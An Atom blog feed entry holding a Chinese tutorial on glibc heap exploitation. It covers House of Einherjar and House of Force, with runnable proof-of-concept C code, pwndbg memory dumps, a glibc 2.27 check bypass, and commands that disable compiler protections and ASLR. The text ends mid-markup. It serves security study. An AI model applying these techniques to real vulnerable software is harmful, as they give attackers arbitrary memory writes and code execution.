<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>K&#39;s House</title>
  
  
  <link href="/atom.xml" rel="self"/>
  
  <link href="https://kabeor.github.io/"/>
  <updated>2020-03-05T11:26:57.053Z</updated>
  <id>https://kabeor.github.io/</id>
  
  <author>
    <name>kabeor</name>
    
  </author>
  
  <generator uri="http://hexo.io/">Hexo</generator>
  
  <entry>
    <title>House of 系列堆漏洞详解(一)</title>
    <link href="https://kabeor.github.io/House%20of%20%E7%B3%BB%E5%88%97%E5%A0%86%E6%BC%8F%E6%B4%9E%E8%AF%A6%E8%A7%A3(%E4%B8%80)/"/>
    <id>https://kabeor.github.io/House of 系列堆漏洞详解(一)/</id>
    <published>2020-03-05T11:22:31.039Z</published>
    <updated>2020-03-05T11:26:57.053Z</updated>
    
    <content type="html"><![CDATA[<h1 id="House-of-系列堆漏洞详解-一"><a href="#House-of-系列堆漏洞详解-一" class="headerlink" title="House of 系列堆漏洞详解(一)"></a>House of 系列堆漏洞详解(一)</h1><p>首发于<a href="https://xz.aliyun.com/t/7266" target="_blank" rel="noopener">先知社区</a></p><h2 id="多Glibc版本调试方法"><a href="#多Glibc版本调试方法" class="headerlink" title="多Glibc版本调试方法"></a>多Glibc版本调试方法</h2><p>由于house of 技术中的一些漏洞只能在特定的低版本Glibc中触发，因此我这里基于pwntools写了一个脚本，可以使文中所示的程序在高版本系统下编译后，gdb调试时能强制加载特定版本的Glibc。</p><p>首先需要准备特定版本的Glibc，这里以libc-2.25.so.6为例</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="comment">#context.log_level = 'debug'</span></span><br><span class="line">context.arch = <span class="string">'amd64'</span></span><br><span class="line"></span><br><span class="line">pro = raw_input(<span class="string">"py &lt;Bin_Path&gt;:   "</span>)</span><br><span class="line">pro=pro.replace(<span class="string">"\n"</span>, <span class="string">""</span>)</span><br><span class="line">io = process([pro],env=&#123;<span class="string">"LD_PRELOAD"</span>:<span class="string">"./libc-2.25.so.6"</span>&#125;)</span><br><span class="line">gdb.attach(io,<span class="string">'set exec-wrapper env "LD_PRELOAD=./libc-2.25.so.6"'</span>)</span><br><span class="line">pause()</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure><p>在弹出的gdb窗口 r 一下就可以运行了。</p><p>这里再提一下gcc编译，如果想要进行源码调试，需要加 -g 选项。-D GLIBC_VERSION=25 选项可设置动态链接的glibc版本为2.25。</p><p>为了方便我们之后的调试，需要在编译时关闭相关保护，选项如下</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">CANNARY</span><br><span class="line">gcc -fno-stack-protector -o <span class="built_in">test</span> test.c  //禁用栈保护</span><br><span class="line">gcc -fstack-protector -o <span class="built_in">test</span> test.c   //启用堆栈保护，不过只为局部变量中含有 char 数组的函数插入保护代码</span><br><span class="line">gcc -fstack-protector-all -o <span class="built_in">test</span> test.c //启用堆栈保护，为所有函数插入保护代码</span><br></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">FORTIFY</span><br><span class="line">gcc -D_FORTIFY_SOURCE=1 仅仅只会在编译时进行检查 </span><br><span class="line">gcc -D_FORTIFY_SOURCE=2 程序执行时也会有检查(如果检查到缓冲区溢出，就终止程序)</span><br></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">NX</span><br><span class="line">gcc -o <span class="built_in">test</span> test.c// 默认情况下，开启NX保护</span><br><span class="line">gcc -z execstack -o <span class="built_in">test</span> test.c// 禁用NX保护</span><br><span class="line">gcc -z noexecstack -o <span class="built_in">test</span> test.c// 开启NX保护</span><br></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">PIE</span><br><span class="line">gcc -o <span class="built_in">test</span> test.c// 默认情况下，不开启PIE</span><br><span class="line">gcc -fpie -pie -o <span class="built_in">test</span> test.c// 开启PIE，此时强度为1</span><br><span class="line">gcc -fPIE -pie -o <span class="built_in">test</span> test.c// 开启PIE，此时为最高强度2</span><br><span class="line">gcc -fpic -o <span class="built_in">test</span> test.c// 开启PIC，此时强度为1，不会开启PIE</span><br><span class="line">gcc -fPIC -o <span class="built_in">test</span> test.c// 开启PIC，此时为最高强度2，不会开启PIE</span><br></pre></td></tr></table></figure><p>系统中关闭PIE选项使用<code>sudo -s echo 0 &gt; /proc/sys/kernel/randomize_va_space</code></p><p>但可能会报错 <code>-bash: /proc/sys/kernel/randomize_va_space: 权限不够</code></p><p>这可能是因为sudo命令不支持重定向</p><p>使用<code>sudo bash -c &quot;echo 0 &gt; /proc/sys/kernel/randomize_va_space&quot;</code>即可</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">RELRO</span><br><span class="line">gcc -o <span class="built_in">test</span> test.c// 默认情况下，是Partial RELRO</span><br><span class="line">gcc -z norelro -o <span class="built_in">test</span> test.c// 关闭，即No RELRO</span><br><span class="line">gcc -z lazy -o <span class="built_in">test</span> test.c// 部分开启，即Partial RELRO</span><br><span class="line">gcc -z now -o <span class="built_in">test</span> test.c// 全部开启，即</span><br></pre></td></tr></table></figure><h2 id="House-of-Einherjar"><a href="#House-of-Einherjar" class="headerlink" title="House of Einherjar"></a>House of Einherjar</h2><h3 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h3><p>House of Einherjar依靠Off-by-one将下一个chunk的 pre_inuse标志位置零，<strong>将 p1 的 prev_size 字段设置为我们想要的目的 chunk 位置与 p1 的差值</strong>，在free下一个chunk时，让free函数以为上一个chunk已经被free，当free最后一个chunk时，会将伪造的chunk和当前chunk和top chunk进行unlink操作，合并成一个top chunk，从而达到将top chunk设置为我们伪造chunk的地址。</p><h3 id="Poc"><a href="#Poc" class="headerlink" title="Poc"></a>Poc</h3><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span>       CHUNKSIZE               0x100</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span>       FIRST_CHUNKSIZE         0x20</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span>       SECOND_CHUNKSIZE        CHUNKSIZE</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span>       THIRD_CHUNKSIZE         0x0</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span>       INTERNAL_SIZE_T         size_t</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span>       SIZE_SZ                 sizeof(INTERNAL_SIZE_T)</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">malloc_chunk</span> &#123;</span></span><br><span class="line">    INTERNAL_SIZE_T         prev_size;</span><br><span class="line">    INTERNAL_SIZE_T         size;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">malloc_chunk</span>*    <span class="title">fd</span>;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">malloc_chunk</span>*    <span class="title">bk</span>;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">malloc_chunk</span>*    <span class="title">fd_nextsize</span>;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">malloc_chunk</span>*    <span class="title">bk_nextsize</span>;</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    setbuf(<span class="built_in">stdin</span>, <span class="literal">NULL</span>);</span><br><span class="line">    setbuf(<span class="built_in">stdout</span>, <span class="literal">NULL</span>);</span><br><span class="line">    setbuf(<span class="built_in">stderr</span>, <span class="literal">NULL</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">char</span> *p0 = <span class="built_in">malloc</span>(FIRST_CHUNKSIZE - SIZE_SZ);</span><br><span class="line">    <span class="comment">// 第一个字节将被覆盖为空字节.</span></span><br><span class="line">    <span class="keyword">char</span> *p1 = <span class="built_in">malloc</span>(SECOND_CHUNKSIZE - SIZE_SZ);</span><br><span class="line">    <span class="comment">// 防止调用 malloc_consolidate().</span></span><br><span class="line">    <span class="keyword">char</span> *p2 = <span class="built_in">malloc</span>(THIRD_CHUNKSIZE);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"House of Einherjar Poc\n\n"</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"堆中共申请三个chunk\n第一个chunk只需要对齐且未分配\n第二个chunk大小必须在smallbin &amp; largebin范围内\n最后一个chunk可以为任意大小，只需要保证不调用malloc_consolidate()\n"</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"\tp0 = %p\n\tp1 = %p\n\tp2 = %p\n"</span>, p0, p1, p2);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"\n----------------\n"</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"在栈中伪造一个fakechunk\n"</span>);</span><br><span class="line"></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">malloc_chunk</span> <span class="title">fakechunk</span>;</span></span><br><span class="line">    fakechunk.size = <span class="number">0</span>;</span><br><span class="line">    fakechunk.fd = &amp;fakechunk;</span><br><span class="line">    fakechunk.bk = &amp;fakechunk;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"当前 fakechunk: \n"</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"\t&amp;fakechunk: %p\n"</span>, &amp;fakechunk);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"\t\t.size: 0x%zx\n\t\t.fd:   %p\n\t\t.bk:   %p\n"</span>,</span><br><span class="line">            fakechunk.size, fakechunk.fd, fakechunk.bk);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"假设p0对p1存在Off-by-one \n因此p1-&gt;size的最低位将被修改为NULL \np1-&gt;prev_size同样受到影响\n\n"</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">off_t</span> diff = (<span class="keyword">off_t</span>)&amp;fakechunk-(<span class="keyword">off_t</span>)(struct malloc_chunk *)(p1-SIZE_SZ*<span class="number">2</span>);</span><br><span class="line">    <span class="comment">// ((struct malloc_chunk *)(p1-SIZE_SZ*2))-&gt;prev_size = -diff;</span></span><br><span class="line">    *((INTERNAL_SIZE_T *)&amp;p0[FIRST_CHUNKSIZE-SIZE_SZ*<span class="number">2</span>]) = -diff;</span><br><span class="line">    p0[FIRST_CHUNKSIZE - SIZE_SZ] = <span class="string">'\0'</span>; <span class="comment">// off-by-one</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"** 溢出触发 **\n"</span>);</span><br><span class="line">    <span class="comment">// ----------------------------------------------</span></span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"通过free(p1)触发合并\n"</span>);</span><br><span class="line">    <span class="built_in">free</span>(p1);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"\n----------------\n"</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"当前 fakechunk: \n"</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"\t&amp;fakechunk: %p\n"</span>, &amp;fakechunk);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"\t\t.size: 0x%zx\n\t\t.fd:   %p\n\t\t.bk:   %p\n"</span>,</span><br><span class="line">            fakechunk.size, fakechunk.fd, fakechunk.bk);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"\n控制fakechunk-&gt;size为合适的值 \n"</span>);</span><br><span class="line">    fakechunk.size = CHUNKSIZE;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"当前 fakechunk: \n"</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"\t&amp;fakechunk: %p\n"</span>, &amp;fakechunk);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"\t\t.size: 0x%zx\n\t\t.fd:   %p\n\t\t.bk:   %p\n"</span>,</span><br><span class="line">            fakechunk.size, fakechunk.fd, fakechunk.bk);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"\n----------------\n"</span>);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"malloc(0x%zx) // fakechunk+SIZE_SZ.\n"</span>,</span><br><span class="line">    CHUNKSIZE - SIZE_SZ);</span><br><span class="line">    <span class="keyword">char</span> *where_you_want = <span class="built_in">malloc</span>(CHUNKSIZE - SIZE_SZ);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"\t目标地址 = %p\n"</span>, where_you_want);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="https://i.loli.net/2020/01/27/rfQziOEBpcmbN4Z.png" alt="image.png"></p><h3 id="分步分析"><a href="#分步分析" class="headerlink" title="分步分析"></a>分步分析</h3><h4 id="1-申请三个chunk"><a href="#1-申请三个chunk" class="headerlink" title="1 申请三个chunk"></a>1 申请三个chunk</h4><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">char</span> *p0 = <span class="built_in">malloc</span>(FIRST_CHUNKSIZE - SIZE_SZ);</span><br><span class="line"><span class="comment">// 第一个字节将被覆盖为空字节.</span></span><br><span class="line"><span class="keyword">char</span> *p1 = <span class="built_in">malloc</span>(SECOND_CHUNKSIZE - SIZE_SZ);</span><br><span class="line"><span class="comment">// 防止调用 malloc_consolidate().</span></span><br><span class="line"><span class="keyword">char</span> *p2 = <span class="built_in">malloc</span>(THIRD_CHUNKSIZE);</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">pwndbg&gt; heap</span><br><span class="line">0x555555559000 PREV_INUSE &#123;</span><br><span class="line">  prev_size = 0, </span><br><span class="line">  size = 657, </span><br><span class="line">  fd = 0x0, </span><br><span class="line">  bk = 0x0, </span><br><span class="line">  fd_nextsize = 0x0, </span><br><span class="line">  bk_nextsize = 0x0</span><br><span class="line">&#125;</span><br><span class="line">0x555555559290 FASTBIN &#123;            # p0</span><br><span class="line">  prev_size = 0, </span><br><span class="line">  size = 33, </span><br><span class="line">  fd = 0x0, </span><br><span class="line">  bk = 0x0, </span><br><span class="line">  fd_nextsize = 0x0, </span><br><span class="line">  bk_nextsize = 0x101               # off-by-one位置</span><br><span class="line">&#125;</span><br><span class="line">0x5555555592b0 PREV_INUSE &#123;         # p1</span><br><span class="line">  prev_size = 0, </span><br><span class="line">  size = 257, </span><br><span class="line">  fd = 0x0, </span><br><span class="line">  bk = 0x0, </span><br><span class="line">  fd_nextsize = 0x0, </span><br><span class="line">  bk_nextsize = 0x0</span><br><span class="line">&#125;</span><br><span class="line">0x5555555593b0 FASTBIN &#123;            # p2</span><br><span class="line">  prev_size = 0, </span><br><span class="line">  size = 33, </span><br><span class="line">  fd = 0x0, </span><br><span class="line">  bk = 0x0, </span><br><span class="line">  fd_nextsize = 0x0, </span><br><span class="line">  bk_nextsize = 0x20c31</span><br><span class="line">&#125;</span><br><span class="line">0x5555555593d0 PREV_INUSE &#123;</span><br><span class="line">  prev_size = 0, </span><br><span class="line">  size = 134193, </span><br><span class="line">  fd = 0x0, </span><br><span class="line">  bk = 0x0, </span><br><span class="line">  fd_nextsize = 0x0, </span><br><span class="line">  bk_nextsize = 0x0</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">pwndbg&gt; x/50xg 0x555555559290</span><br><span class="line">0x555555559290:0x00000000000000000x0000000000000021 &lt;== p0</span><br><span class="line">0x5555555592a0:0x00000000000000000x0000000000000000</span><br><span class="line">0x5555555592b0:0x00000000000000000x0000000000000101 &lt;== p1</span><br><span class="line">0x5555555592c0:0x00000000000000000x0000000000000000</span><br><span class="line">0x5555555592d0:0x00000000000000000x0000000000000000</span><br><span class="line">                       ...</span><br><span class="line">0x555555559390:0x00000000000000000x0000000000000000</span><br><span class="line">0x5555555593a0:0x00000000000000000x0000000000000000</span><br><span class="line">0x5555555593b0:0x00000000000000000x0000000000000021 &lt;== p2</span><br><span class="line">0x5555555593c0:0x00000000000000000x0000000000000000</span><br><span class="line">0x5555555593d0:0x00000000000000000x0000000000020c31 &lt;== top chunk</span><br><span class="line">0x5555555593e0:0x00000000000000000x0000000000000000</span><br></pre></td></tr></table></figure><h4 id="2-off-by-one"><a href="#2-off-by-one" class="headerlink" title="2 off-by-one"></a>2 off-by-one</h4><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">off_t</span> diff = (<span class="keyword">off_t</span>)&amp;fakechunk-(<span class="keyword">off_t</span>)(struct malloc_chunk *)(p1-SIZE_SZ*<span class="number">2</span>);</span><br><span class="line"><span class="comment">// ((struct malloc_chunk *)(p1-SIZE_SZ*2))-&gt;prev_size = -diff;</span></span><br><span class="line">*((INTERNAL_SIZE_T *)&amp;p0[FIRST_CHUNKSIZE-SIZE_SZ*<span class="number">2</span>]) = -diff; <span class="comment">//fakechunk与p1的偏移量</span></span><br><span class="line">p0[FIRST_CHUNKSIZE - SIZE_SZ] = <span class="string">'\0'</span>; <span class="comment">// off-by-one</span></span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">0x555555559290 FASTBIN &#123;</span><br><span class="line">  prev_size = 0, </span><br><span class="line">  size = 33, </span><br><span class="line">  fd = 0x0, </span><br><span class="line">  bk = 0x0, </span><br><span class="line">  fd_nextsize = 0xffffd5555555b750,   &lt;== 偏移量</span><br><span class="line">  bk_nextsize = 0x100</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">pwndbg&gt; x/50xg 0x555555559290</span><br><span class="line">0x555555559290:0x00000000000000000x0000000000000021</span><br><span class="line">0x5555555592a0:0x00000000000000000x0000000000000000</span><br><span class="line">0x5555555592b0:0xffffd5555555b750  0x0000000000000100 &lt;==覆盖inuse</span><br><span class="line">0x5555555592c0:0x00000000000000000x0000000000000000</span><br><span class="line">                       ...</span><br><span class="line">0x555555559390:0x00000000000000000x0000000000000000</span><br><span class="line">0x5555555593a0:0x00000000000000000x0000000000000000</span><br><span class="line">0x5555555593b0:0x00000000000000000x0000000000000021</span><br><span class="line">0x5555555593c0:0x00000000000000000x0000000000000000</span><br><span class="line">0x5555555593d0:0x00000000000000000x0000000000020c31</span><br><span class="line">0x5555555593e0:0x00000000000000000x0000000000000000</span><br></pre></td></tr></table></figure><h4 id="3-free-p1"><a href="#3-free-p1" class="headerlink" title="3 free p1"></a>3 free p1</h4><p>p1 free前与free后比较</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">0x5555555592b0 &#123;</span><br><span class="line">  prev_size = 18446697161213458256, </span><br><span class="line">  size = 256, </span><br><span class="line">  fd = 0x0, </span><br><span class="line">  bk = 0x0,                &lt;------------------</span><br><span class="line">  fd_nextsize = 0x0, </span><br><span class="line">  bk_nextsize = 0x0</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">0x5555555592b0 &#123;</span><br><span class="line">  prev_size = 18446697161213458256, </span><br><span class="line">  size = 256, </span><br><span class="line">  fd = 0x0, </span><br><span class="line">  bk = 0x555555559010,     &lt;------------------</span><br><span class="line">  fd_nextsize = 0x0, </span><br><span class="line">  bk_nextsize = 0x0</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="4-malloc"><a href="#4-malloc" class="headerlink" title="4 malloc"></a>4 malloc</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">pwndbg&gt; </span><br><span class="line">目标地址 = 0x7fffffffdb50</span><br></pre></td></tr></table></figure><p>通过计算，重新申请到新的位置</p><h3 id="Glibc-2-27"><a href="#Glibc-2-27" class="headerlink" title="Glibc 2.27"></a>Glibc 2.27</h3><p>在2.27版本中malloc.c对<em>prev_size</em> 的检查如下</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> (__builtin_expect (chunksize(P) != prev_size (next_chunk(P)), <span class="number">0</span>))\</span><br><span class="line">  malloc_printerr (<span class="string">"corrupted size vs. prev_size"</span>);            \</span><br></pre></td></tr></table></figure><p><strong>只需要再伪造 fake chunk 的 next chunk 的 prev_size 字段就可以了</strong>。</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">fake_chunk2 = (struct malloc_chunk *)p0 + <span class="number">1</span>;</span><br><span class="line"></span><br><span class="line">fake_chunk2-&gt;prev_size = <span class="keyword">sizeof</span>(struct malloc_chunk);</span><br></pre></td></tr></table></figure><h3 id="利用思路"><a href="#利用思路" class="headerlink" title="利用思路"></a>利用思路</h3><p>通过house_of_einherjar，我们可以控制top chunk，再次malloc后，我们可以控制程序相应位置，按照程序功能，可能会达到任意地址读写，然后就可以通过一般手段getshell。</p><h2 id="House-of-force"><a href="#House-of-force" class="headerlink" title="House of force"></a>House of force</h2><h3 id="原理-1"><a href="#原理-1" class="headerlink" title="原理"></a>原理</h3><p>假设top chunk的header可被溢出覆盖，可以将size修改为一个大数，使得所有初始化都通过top chunk而不是mmap，再malloc就可以使接下来的任何操作都调用指定地址，这里相当于一次任意地址写。</p><p>利用条件：</p><ul><li>1.用户能够以溢出等方式控制到top chunk的size域</li><li>2.用户能够自由的控制堆分配尺寸的大小</li></ul><h3 id="Poc-1"><a href="#Poc-1" class="headerlink" title="Poc"></a>Poc</h3><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdint.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdint.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;malloc.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">char</span> bss_var[] = <span class="string">"这里是将要被覆写的字符串."</span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc , <span class="keyword">char</span>* argv[])</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"\nHouse of Force Poc\n\n"</span>);</span><br><span class="line"></span><br><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"\n我们将通过此漏洞覆写地址 %p 的值.\n"</span>, bss_var);</span><br><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"当前值为: %s\n"</span>, bss_var);</span><br><span class="line"></span><br><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"\n申请第一个chunk.\n"</span>);</span><br><span class="line"><span class="keyword">intptr_t</span> *p1 = <span class="built_in">malloc</span>(<span class="number">256</span>);</span><br><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"大小为256 bytes 的chunk 在 %p 被申请.\n"</span>, p1 - <span class="number">2</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">int</span> real_size = malloc_usable_size(p1);</span><br><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"分配的块的实际大小是 %ld.\n"</span>, real_size + <span class="keyword">sizeof</span>(<span class="keyword">long</span>)*<span class="number">2</span>);</span><br><span class="line"></span><br><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"\n假设存在一个可溢出到 top chunk 的漏洞\n"</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">intptr_t</span> *ptr_top = (<span class="keyword">intptr_t</span> *) ((<span class="keyword">char</span> *)p1 + real_size - <span class="keyword">sizeof</span>(<span class="keyword">long</span>));</span><br><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"\ntop chunk 起始地址是 %p\n"</span>, ptr_top);</span><br><span class="line"></span><br><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"\n用一个极大值覆写top chunk的size使得malloc不会调用mmap\n"</span>);</span><br><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"top chunk的旧size %#llx\n"</span>, *((<span class="keyword">unsigned</span> <span class="keyword">long</span> <span class="keyword">long</span> <span class="keyword">int</span> *)((<span class="keyword">char</span> *)ptr_top + <span class="keyword">sizeof</span>(<span class="keyword">long</span>))));</span><br><span class="line">*(<span class="keyword">intptr_t</span> *)((<span class="keyword">char</span> *)ptr_top + <span class="keyword">sizeof</span>(<span class="keyword">long</span>)) = <span class="number">-1</span>;</span><br><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"top chunk的新size %#llx\n"</span>, *((<span class="keyword">unsigned</span> <span class="keyword">long</span> <span class="keyword">long</span> <span class="keyword">int</span> *)((<span class="keyword">char</span> *)ptr_top + <span class="keyword">sizeof</span>(<span class="keyword">long</span>))));</span><br><span class="line"></span><br><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"\n接下来申请一个chunk，通过整数溢出指向该chunk"</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">long</span> evil_size = (<span class="keyword">unsigned</span> <span class="keyword">long</span>)bss_var - <span class="keyword">sizeof</span>(<span class="keyword">long</span>)*<span class="number">4</span> - (<span class="keyword">unsigned</span> <span class="keyword">long</span>)ptr_top;</span><br><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"\n我们想要写的值位于 %p, top chunk 位于 %p, 通过计算头部size,\n"</span></span><br><span class="line">   <span class="string">"我们应该 malloc %#lx bytes.\n"</span>, bss_var, ptr_top, evil_size);</span><br><span class="line"><span class="keyword">void</span> *new_ptr = <span class="built_in">malloc</span>(evil_size);</span><br><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"新指针和旧top chunk一样指向: %p\n"</span>, new_ptr - <span class="keyword">sizeof</span>(<span class="keyword">long</span>)*<span class="number">2</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">void</span>* ctr_chunk = <span class="built_in">malloc</span>(<span class="number">100</span>);</span><br><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"\n下一个chunk将指向目标buffer.\n"</span>);</span><br><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"malloc(100) =&gt; %p!\n"</span>, ctr_chunk);</span><br><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"现在我们可覆写该字符串:\n"</span>);</span><br><span class="line"></span><br><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"... old string: %s\n"</span>, bss_var);</span><br><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"... 使用 strcpy 覆写 \"YEAH!!!\"...\n"</span>);</span><br><span class="line"><span class="built_in">strcpy</span>(ctr_chunk, <span class="string">"YEAH!!!"</span>);</span><br><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"... new string: %s\n"</span>, bss_var);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="https://i.loli.net/2020/01/27/yaJ9vnYsFzPKLjA.png" alt="image.png"></p><h3 id="分步分析-1"><a href="#分步分析-1" class="headerlink" title="分步分析"></a>分步分析</h3><h4 id="1-申请一个chunk"><a href="#1-申请一个chunk" class="headerlink" title="1 申请一个chunk"></a>1 申请一个chunk</h4><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">intptr_t</span> *p1 = <span class="built_in">malloc</span>(<span class="number">256</span>);</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">pwndbg&gt; heap</span><br><span class="line">0x555555559000 PREV_INUSE &#123;</span><br><span class="line">  mchunk_prev_size = 0, </span><br><span class="line">  mchunk_size = 657, </span><br><span class="line">  fd = 0x0, </span><br><span class="line">  bk = 0x0, </span><br><span class="line">  fd_nextsize = 0x0, </span><br><span class="line">  bk_nextsize = 0x0</span><br><span class="line">&#125;</span><br><span class="line">0x555555559290 PREV_INUSE &#123;</span><br><span class="line">  mchunk_prev_size = 0, </span><br><span class="line">  mchunk_size = 273, </span><br><span class="line">  fd = 0x0, </span><br><span class="line">  bk = 0x0, </span><br><span class="line">  fd_nextsize = 0x0, </span><br><span class="line">  bk_nextsize = 0x0</span><br><span class="line">&#125;</span><br><span class="line">0x5555555593a0 PREV_INUSE &#123;</span><br><span class="line">  mchunk_prev_size = 0, </span><br><span class="line">  mchunk_size = 134241, </span><br><span class="line">  fd = 0x0, </span><br><span 